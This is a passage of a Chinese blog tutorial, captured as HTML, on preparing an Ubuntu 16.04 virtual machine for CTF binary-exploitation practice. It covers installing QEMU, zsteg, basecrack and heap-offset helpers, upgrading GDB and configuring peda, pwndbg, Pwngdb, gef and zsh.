class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> autoconf automake libtool<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="安装-main-arena-offset"><a href="#安装-main-arena-offset" class="headerlink" title="安装 main_arena_offset"></a>安装 main_arena_offset</h2><blockquote><p>获取给定 libc 的 main_arena 偏移量</p><p>作者 <a href="https://github.com/zarkivy">zarkivy</a> 将其集成到了 pymao 库中：<a href="https://github.com/zarkivy/py_main_arena_offset">GitHub - zarkivy&#x2F;py_main_arena_offset: Get main_arena offset of a given libc with python</a> （依赖于 objdump，请确保你的 Linux 中已安装 binutils 包）</p></blockquote><ul><li>原版</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/bash-c/main_arena_offset /opt/main_arena_offset<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /opt/main_arena_offset./main_arena libc文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>pymao 集成版</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/IZAY01/py_main_arena_offset /opt/py_main_arena_offset<span class="token builtin class-name">cd</span> /opt/py_main_arena_offset<span class="token function">sudo</span> python3 setup.py develop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用示例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pymao <span class="token keyword">import</span> <span class="token operator">*</span>libc <span class="token operator">=</span> <span class="token string">"./libc-2.27.so"</span>main_arena_offset <span class="token operator">=</span> gmao<span class="token punctuation">(</span>libc<span class="token punctuation">)</span><span class="token comment"># or main_arena_offset = get_main_arena_offset(libc)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-QEMU"><a href="#安装-QEMU" class="headerlink" title="安装 QEMU"></a>安装 QEMU</h2><blockquote><p>这是 arm 的 pwn 环境，QEMU 可以用来模拟各种架构的固件的运行，前期可以不安装，但是终究是逃不过的，建议一步到位</p><p>VMware 和 Virtualbox 之类通常只能在 x86 计算机上虚拟出一个 x86 虚拟机，而 QEMU 支持在 x86 上虚拟出一个 ARM 虚拟机</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu qemu-kvm virt-manager bridge-utils binfmt-support<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span>  qemu-system qemu-user-static   <span class="token comment"># 安装系统态、用户态</span><span class="token comment"># 安装依赖库</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> gcc-arm-linux-gnueabi<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu libncurses5-dev gcc-arm-linux-gnueabi build-essential gdb-arm-none-eabi synaptic gcc-aarch64-linux-gnu eclipse-cdt <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过 apt 方式安装的 QEMU 卸载：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 删除包和相关依赖</span><span class="token function">sudo</span> <span class="token function">apt-get</span> remove --auto-remove qemu*<span class="token comment"># 删除配置文件和相关的数据文件</span><span class="token function">sudo</span> <span class="token function">apt-get</span> purge --auto-remove qemu*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-Zsteg"><a href="#安装-Zsteg" class="headerlink" title="安装 Zsteg"></a>安装 Zsteg</h2><blockquote><p>做 MISC 需要，图像隐写神器</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> zsteg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="安装-Basecrack"><a href="#安装-Basecrack" class="headerlink" title="安装 Basecrack"></a>安装 Basecrack</h2><blockquote><p>做 REVERSE、MISC 需要，Base 系列编码分析工具</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/mufeedvh/basecrack.git /opt/basecrack<span class="token builtin class-name">cd</span> /opt/basecrackpip <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements.txtpython basecrack.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="升级-GDB-到-gdb-10-2"><a href="#升级-GDB-到-gdb-10-2" class="headerlink" title="升级 GDB 到 gdb-10.2"></a>升级 GDB 到 gdb-10.2</h1><blockquote><p>Ubuntu 16.4 自带的 GDB 版本太老（gdb-7.11.1），可以更新到 gdb-10.2</p><p>我尝试过安装 gdb-12.1 和 gdb-11.2，但是都会报错，估计与 python 3.5 有关 （使用 python 3.10.6 编译 GDB 依然报错），暂未解决，如果你喜欢折腾可以自己尝试一下，报错如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA1.png" alt="Ubuntu16.04虚拟机PWN环境搭建1.png"></p><p>参考文章：</p><ol><li><a href="https://blog.csdn.net/qq_39153421/article/details/116753735">Ubuntu16.04升级gdb7.11升级到10.2版本_ubuntu gdb升级命令-CSDN博客</a></li><li><a href="https://blog.csdn.net/EJoft/article/details/123036910">Ubuntu18.04升级gdb10.2_gdb10.2.tar.gz_EJoft的博客-CSDN博客</a></li></ol></blockquote><p>下载 GDB 源码：<a href="https://ftp.gnu.org/gnu/gdb/">Index of &#x2F;gnu&#x2F;gdb</a></p><p>这里以 gdb-10.2.tar.gz 为例</p><p>编译安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> gdb-10.2.tar.gz<span class="token builtin class-name">cd</span> ./gdb-10.2<span class="token function">mkdir</span> build <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> build<span class="token function">sudo</span> <span class="token punctuation">..</span>/configure --with-python<span class="token operator">=</span>/usr/bin/python3.5 --enable-targets<span class="token operator">=</span>all<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里 <code>--with-python=/usr/bin/python3.5</code> 指定使用系统自带的 python 3.5 来编译 GDB</p><p>如果自己源码编译安装了新版的 Python，这里指定用新版的 Python 进行编译，编译时可能会报下列错误：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">configure: WARNING: MPFR is missing or unusable<span class="token punctuation">;</span> some features may be unavailable.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>网上说是与 Python 的 <code>distutils</code> 和 <code>dev</code> 有关，源码编译的 Python 缺少相应的 <code>python-distutils</code> 和 <code>python-dev</code></p><p>但是暂时还未解决该问题，所以建议直接使用系统自带的 python 3.5 来编译 GDB，较为稳定</p><p>编译过程很漫长，编译可能会报如下错误：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WARNING: <span class="token string">'makeinfo'</span> is missing on your system.         You should only need it <span class="token keyword">if</span> you modified a <span class="token string">'.texi'</span> file, or         any other <span class="token function">file</span> indirectly affecting the aspect of the manual.         You might want to <span class="token function">install</span> the Texinfo package:         <span class="token operator">&lt;</span>http://www.gnu.org/software/texinfo/<span class="token operator">></span>         The spurious makeinfo call might also be the consequence of         using a buggy <span class="token string">'make'</span> <span class="token punctuation">(</span>AIX, DU, IRIX<span class="token punctuation">)</span>, <span class="token keyword">in</span> <span class="token function">which</span> <span class="token keyword">case</span> you might         want to <span class="token function">install</span> GNU make:         <span class="token operator">&lt;</span>http://www.gnu.org/software/make/<span class="token operator">></span>make<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>: *** <span class="token punctuation">[</span>gdb.info<span class="token punctuation">]</span> Error <span class="token number">127</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装 <code>texinfo</code> 即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> texinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来，替换老版本 GDB</p><p>编译生成的新版 gdb 二进制文件一般位于编译目录 <code>gdb-10.2/build/gdb/gdb</code>，如果不在该目录下，可以使用指令查找：<code>sudo find / -name gdb</code></p><p>将 gdb 二进制文件拷贝到 <code>/usr/bin/</code> 下，替换原来的旧版 gdb，也可以先将原来的旧版 gdb 做个备份，以防出问题：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mv</span> /usr/local/bin/gdb /usr/local/bin/gdb-7.11.1.backup<span class="token comment"># 以自己编译的新版 gdb 实际路径为主</span><span class="token function">sudo</span> <span class="token function">cp</span> ~/下载/gdb-10.2/build/gdb/gdb /usr/local/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>运行 GDB，升级完成：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA6.png" alt="Ubuntu16.04虚拟机PWN环境搭建6.png"></p><hr><h1 id="GDB-配置"><a href="#GDB-配置" class="headerlink" title="GDB 配置"></a>GDB 配置</h1><blockquote><p><em>见 《GDB的基础和使用》一文，有非常详细的介绍</em></p><p><mark>但是需要注意，Ubuntu 16.04 由于版本太老，无法直接安装最新版 <code>pwndbg</code> 和 <code>gef</code>，要自己通过旧版本安装</mark></p><p><strong>Ubuntu 16.04 安装 GDB 插件请以本文为主</strong>，<strong>设置脚本自动切换 GDB 插件可以参照《GDB的基础和使用》一文</strong></p></blockquote><h2 id="安装-peda"><a href="#安装-peda" class="headerlink" title="安装 peda"></a>安装 peda</h2><p>最新版安装方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/longld/peda.git /opt/gdb_plugins/peda<span class="token function">sudo</span> <span class="token builtin class-name">echo</span> <span class="token string">"source /opt/gdb_plugins/peda/peda.py"</span> <span class="token operator">>></span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>在 Ubuntu 16.04 中使用上述方法安装，暂时没有出现问题</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA9.png" alt="Ubuntu16.04虚拟机PWN环境搭建9.png"></p><hr><h2 id="安装-pwndbg"><a href="#安装-pwndbg" class="headerlink" title="安装 pwndbg"></a>安装 pwndbg</h2><blockquote><p><code>pwndbg</code> 与 <code>Pwngdb</code> 需要一起搭配使用</p></blockquote><p>最新版安装方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/pwndbg/pwndbg /opt/gdb_plugins/pwndbg<span class="token builtin class-name">cd</span> /opt/gdb_plugins/pwndbg<span class="token function">sudo</span> ./setup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>如果在 Ubuntu 16.04 这样的老版本中使用上述方法，安装过程中会报错<br>因为 python 版本太低不支持新的语法，无法安装最新的 pwndbg <em>（pwndbg 会检测 GDB 所使用的 python 版本，与 GDB 的 python 保持一致，默认是 python 3.5）</em></p><p>报错信息如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">File <span class="token string">"/usr/local/lib/python3.5/dist-packages/pip/_internal/cli/main.py"</span>, line <span class="token number">57</span>  sys.stderr.write<span class="token punctuation">(</span>f<span class="token string">"ERROR: &#123;exc&#125;"</span><span class="token punctuation">)</span>  ^  SyntaxError: invalid syntax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA2.png" alt="Ubuntu16.04虚拟机PWN环境搭建2.png"></p></blockquote><p>Ubuntu 16.04 需要在 <a href="https://github.com/pwndbg/pwndbg">https://github.com/pwndbg/pwndbg</a> 中下载旧版本的源码</p><p>比如 2021 版的 pwndbg 就可以正常使用：<a href="https://github.com/pwndbg/pwndbg/tree/2021.06.22">pwndbg&#x2F;pwndbg at 2021.06.22 (github.com)</a> （实测 <code>pwndbg-2022.01.05</code> 版也可以）</p><p>然后解压移动到 <code>/opt/gdb_plugins/</code> 目录下，在 <code>/opt/gdb_plugins/pwndbg-2021.06.22</code> 目录下使用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ./setup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装过程中会报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">+ <span class="token function">git</span> submodule update <span class="token parameter variable">--init</span> <span class="token parameter variable">--recursive</span>fatal: Not a <span class="token function">git</span> repository <span class="token punctuation">(</span>or any of the parent directories<span class="token punctuation">)</span>: .git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在当前目录下初始化 git 再重新安装即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="安装-Pwngdb"><a href="#安装-Pwngdb" class="headerlink" title="安装 Pwngdb"></a>安装 Pwngdb</h3><p>安装方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/scwuaptx/Pwngdb.git /opt/gdb_plugins/Pwngdb<span class="token builtin class-name">cd</span> /opt/gdb_plugins/Pwngdb<span class="token function">sudo</span> <span class="token function">cp</span> .gdbinit ~/<span class="token function">sudo</span> <span class="token function">vim</span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>~/.gdbinit</code> 的第二行插入：（记得插入在 <code>source /opt/gdb_plugins/Pwngdb/pwngdb.py</code> 这一句的前面）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> /opt/gdb_plugins/pwndbg-2021.06.22/gdbinit.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果 pwndbg 的路径不是 <code>/opt/gdb_plugins/pwndbg-2021.06.22</code>，请按照自己的实际路径修改</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA8.png" alt="Ubuntu16.04虚拟机PWN环境搭建8.png"></p><hr><h3 id="配置-pwndbg-分屏调试"><a href="#配置-pwndbg-分屏调试" class="headerlink" title="配置 pwndbg 分屏调试"></a>配置 pwndbg 分屏调试</h3><blockquote><p>由于 pwndbg 输出的信息较多，经常在一页上看不全，需要上下翻找，眼花缭乱</p><p>我们可以设置 pwndbg 分屏调试，一边屏幕输入命令，一边屏幕查看输出信息，提高效率</p></blockquote><h4 id="方法一：修改-gdbinit"><a href="#方法一：修改-gdbinit" class="headerlink" title="方法一：修改 gdbinit"></a>方法一：修改 gdbinit</h4><p>配置很简单，先后打开两个终端</p><p>假设先打开的一个终端用于开启 gdb 调试并输入调试命令，后打开的一个终端用于输出调试信息</p><p>在两个终端分别输入 <code>tty</code>，先打开的终端为 <code>/dev/pts/19</code>，后打开的为 <code>/dev/pts/20</code> <em>（以自己的实际输出信息为主）</em></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A82.png" alt="GDB的基础和使用2.png"></p><p>修改 <code>~/.gdbinit</code> 中的内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <code>~/.gdbinit</code> 末尾加入一句：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> context-output xxx<span class="token comment"># 这里的 xxx 就是用于输出调试信息的分屏，我这里是：/dev/pts/20</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><mark>注意：如果你开了多个终端，就设置为实际想要用于输出调试信息的分屏</mark></p><p>保存退出</p><p>在先打开的终端中开启 gdb 并输入调试命令，在后打开的终端中即可输出调试信息</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A83.png" alt="GDB的基础和使用3.png"></p><p>然后我们将屏幕调整一下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A84.png" alt="GDB的基础和使用4.png"></p><blockquote><p>设置分屏后，如果只开启一个终端，使用 gdb 可能会遇到如下报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Exception occurred: context: <span class="token punctuation">[</span>Errno <span class="token number">13</span><span class="token punctuation">]</span> 权限不够: <span class="token string">'/dev/pts/20'</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>class <span class="token string">'PermissionError'</span><span class="token operator">></span><span class="token punctuation">)</span>  For <span class="token function">more</span> info invoke <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">set</span> exception-verbose on<span class="token variable">`</span></span> and rerun the <span class="token builtin class-name">command</span>  or debug it by yourself with <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">set</span> exception-debugger on<span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>再开启一个终端即可解决 （新开启的终端需为 &#x2F;dev&#x2F;pts&#x2F;20）</p></blockquote><hr><h4 id="方法二：gdb-临时设置"><a href="#方法二：gdb-临时设置" class="headerlink" title="方法二：gdb 临时设置"></a>方法二：gdb 临时设置</h4><p>由于有时候新开启的终端并不是我们在 <code>~/.gdbinit</code> 中设置的那个终端，频繁更改 <code>~/.gdbinit</code> 中的内容未免太过麻烦</p><p>所以，我们也可以不在 <code>~/.gdbinit</code> 中设置，而是先在一个终端中启动 gdb 调试，然后再另开一个新的终端，使用 <code>tty</code> 查看新的终端的分屏信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tty</span><span class="token comment"># 假设输出为：/dev/pts/18</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后在 gdb 中直接设置输出调试信息的分屏： （以自己上一步实际的分屏信息为主）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> context-output /dev/pts/18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以避免新打开的终端与我们在 <code>~/.gdbinit</code> 中设置的终端不一致的问题</p><hr><h2 id="安装-gef"><a href="#安装-gef" class="headerlink" title="安装 gef"></a>安装 gef</h2><p>最新版安装方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/hugsy/gef /opt/gdb_plugins/gef<span class="token function">sudo</span> <span class="token builtin class-name">echo</span> <span class="token string">"source /opt/gdb_plugins/gef/gef.py"</span> <span class="token operator">>></span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>如果在 Ubuntu 16.04 这样的老版本中使用上述方法，打开 gdb 会报错</p><p>与 pwndbg 一样，是因为 python 版本太低不支持新的语法，无法安装最新的 gef</p></blockquote><p>Ubuntu 16.04 需要在 <a href="https://github.com/hugsy/gef">https://github.com/hugsy/gef</a> 中下载旧版本的源码</p><p>比如 2021 版的 gef 就可以正常使用：<a href="https://github.com/hugsy/gef/releases/tag/2021.10">Release 2021.10 - Royal Kill · hugsy&#x2F;gef (github.com)</a></p><p>然后解压移动到 <code>/opt/gdb_plugins/</code> 目录下，在 <code>/opt/gdb_plugins/gef-2021.10</code> 目录下使用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token builtin class-name">echo</span> <span class="token string">"source /opt/gdb_plugins/gef-2021.10/gef.py"</span> <span class="token operator">>></span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开 gdb 后如果 <code>gef</code> 显示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">3</span> <span class="token builtin class-name">command</span> could not be loaded, run <span class="token variable"><span class="token variable">`</span>gef missing<span class="token variable">`</span></span> to know why.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入 <code>gef missing</code> 查看缺失的库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Command <span class="token variable"><span class="token variable">`</span>set-permission<span class="token variable">`</span></span> is missing, reason  →  Missing <span class="token variable"><span class="token variable">`</span>keystone-engine<span class="token variable">`</span></span> package, <span class="token function">install</span> with: <span class="token variable"><span class="token variable">`</span>pip <span class="token function">install</span> keystone-engine<span class="token variable">`</span></span><span class="token builtin class-name">.</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Command <span class="token variable"><span class="token variable">`</span>ropper<span class="token variable">`</span></span> is missing, reason  →  Missing <span class="token variable"><span class="token variable">`</span>ropper<span class="token variable">`</span></span> package <span class="token keyword">for</span> Python, <span class="token function">install</span> with: <span class="token variable"><span class="token variable">`</span>pip <span class="token function">install</span> ropper<span class="token variable">`</span></span><span class="token builtin class-name">.</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Command <span class="token variable"><span class="token variable">`</span>assemble<span class="token variable">`</span></span> is missing, reason  →  Missing <span class="token variable"><span class="token variable">`</span>keystone-engine<span class="token variable">`</span></span> package <span class="token keyword">for</span> Python, <span class="token function">install</span> with: <span class="token variable"><span class="token variable">`</span>pip <span class="token function">install</span> keystone-engine<span class="token variable">`</span></span><span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用 pip 安装对应的库即可</p><p><strong>注意要用 GDB 所使用的 python 版本对应的 pip 来安装，Ubuntu 16.04 的 GDB 默认使用 python 3.5</strong></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA7.png" alt="Ubuntu16.04虚拟机PWN环境搭建7.png"></p><hr><h2 id="验证安装"><a href="#验证安装" class="headerlink" title="验证安装"></a>验证安装</h2><ul><li>自用的 <code>~/.gdbinit</code> 文件内容示例：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># source /opt/gdb_plugins/peda/peda.py</span><span class="token builtin class-name">source</span> /opt/gdb_plugins/pwndbg-2021.06.22/gdbinit.py<span class="token comment"># source /opt/gdb_plugins/gef-2021.10/gef.py</span><span class="token builtin class-name">source</span> /opt/gdb_plugins/Pwngdb/pwngdb.py<span class="token builtin class-name">source</span> /opt/gdb_plugins/Pwngdb/angelheap/gdbinit.pydefine hook-runpython<span class="token function">import</span> angelheapangelheap.init_angelheap<span class="token punctuation">(</span><span class="token punctuation">)</span>endend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>终端输入 <code>gdb</code>：</p><ol><li>当启用 <strong>peda</strong> 时，会出现：<code>gdb-peda$ </code></li><li>当启用 <strong>pwndbg</strong> 时，会出现：<code>pwndbg&gt; </code></li><li>当启用 <strong>gef</strong> 时，会出现：<code>gef➤ </code></li></ol><p>如果验证出现上述输出内容，<mark>并且在输出内容之前没有任何报错提示</mark>，则说明安装成功</p><p>如果没有安装成功，输入 <code>gdb</code> 会显示默认的：<code>(gdb) </code></p></blockquote><p><mark>另外，可以设置脚本自动切换不同的 GDB 插件使用，省去手动注释 <code>~/.gdbinit</code> 文件的麻烦，具体方法请移步《GDB的基础和使用》</mark></p><hr><h1 id="配置-ZSH-终端"><a href="#配置-ZSH-终端" class="headerlink" title="配置 ZSH 终端"></a>配置 ZSH 终端</h1><blockquote><p>对比 Ubuntu 和 Kali 之后，觉得 Kali 的<mark>终端历史命令自动补全</mark>的功能真的是太好用了，还有<mark>命令输入正确和错误的高亮提示</mark>，简直不要太好用，原因就在于 Kali 2020 之后的版本默认终端为 zsh</p><p>Ubuntu 也可以安装 zsh 作为终端哦，不用再羡慕隔壁 Kali 啦，接下来用 zsh 打造一个究极好用的全新 Ubuntu 终端吧</p><p>参考文章：</p><ol><li><a href="https://blog.csdn.net/qq_51692609/article/details/121228694">Ubuntu版本安装zsh、配置ohmyzsh及插件、主题更换_ubuntu ohmyzsh-CSDN博客</a></li><li><a href="https://www.bktus.com/archives/2759">解决oh-my-zsh plugin ‘zsh-autosuggestions’ not found 与 plugin ‘zsh-syntax-highlighting’ not found问题 | BaKanTu union us (bktus.com)</a></li></ol><p><strong>注意：安装 <code>zsh</code> 后，以后所有要写入 <code>~/.bashrc</code> 的配置全都只需要写入 <code>~/.zshrc</code> 即可</strong></p></blockquote><p>安装 <code>zsh</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> upgrade<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">zsh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>为了配置 <code>zsh</code>，还必须安装 <code>zsh</code> 的配置工具 <code>oh my zsh</code>，安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/robbyrussell/oh-my-zsh /opt/oh-my-zsh<span class="token builtin class-name">cd</span> /opt/oh-my-zsh/tools<span class="token function">sh</span> install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输入 <code>y</code> 将默认 shell 更改为 <code>zsh</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Looking <span class="token keyword">for</span> an existing <span class="token function">zsh</span> config<span class="token punctuation">..</span>.Found /root/.zshrc. Backing up to /root/.zshrc.pre-oh-my-zshUsing the Oh My Zsh template <span class="token function">file</span> and adding it to /root/.zshrc.Time to change your default shell to zsh:Do you want to change your default shell to zsh? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA10.png" alt="Ubuntu16.04虚拟机PWN环境搭建10.png"></p><p>验证安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zsh</span> <span class="token parameter variable">--version</span><span class="token comment"># zsh 5.1.1 (x86_64-ubuntu-linux-gnu)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>添加原来 bash 的环境变量，将 <code>~/.zshrc</code> 的第二行取消注释：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA25.png" alt="Linux虚拟机CTF环境搭建25.png"></p><p>使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一些可能的问题：</p><ol><li>如果使用 <code>zsh</code> 过程中历史记录出现问题，报错如下：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zsh: corrupt <span class="token function">history</span> <span class="token function">file</span> /home/wyy/.zsh_history<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除原历史记录并重建：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> ~/.zsh_history ~/.zsh_history_badstrings <span class="token parameter 